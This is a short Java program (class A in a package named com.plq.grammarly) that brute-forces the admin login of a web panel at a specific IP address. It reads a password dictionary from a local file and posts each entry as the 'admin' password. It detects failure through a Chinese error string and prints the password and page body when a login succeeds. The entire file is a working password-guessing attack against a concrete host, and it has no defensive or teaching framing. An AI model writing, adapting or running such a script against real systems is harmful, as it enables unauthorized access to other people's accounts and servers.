package com.plq.grammarly;

import cn.hutool.core.io.FileUtil;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;

import java.util.List;

public class A {

    public static void main(String[] args) {
        int i=0;

        List<String> passwords = FileUtil.readUtf8Lines("C:\\Users\\plq\\Downloads\\dict\\dict.txt");
        for(String pw : passwords) {
            i++;
            if (i<6859 || pw.isEmpty()) {
                continue;
            }
            try {
                HttpResponse httpResponse = HttpUtil.createPost("http://101.43.47.23:81/admin/index.php?action=login")
                        .form("user", "admin")
                        .form("pw", pw)
                        .timeout(3000)
                        .setFollowRedirects(true)
                        .keepAlive(true)
                        .execute();
                String body = httpResponse.body();
                if (body.contains("账号密码有误")) {
                    System.out.println("第"+ i + "次，结果失败");
                } else {
                    System.out.println("密码:" + pw);
                    System.out.println(body);
                    break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            if (i%10000 == 0) {
                System.out.println("i值:" + i);
            }
        }
    }
}
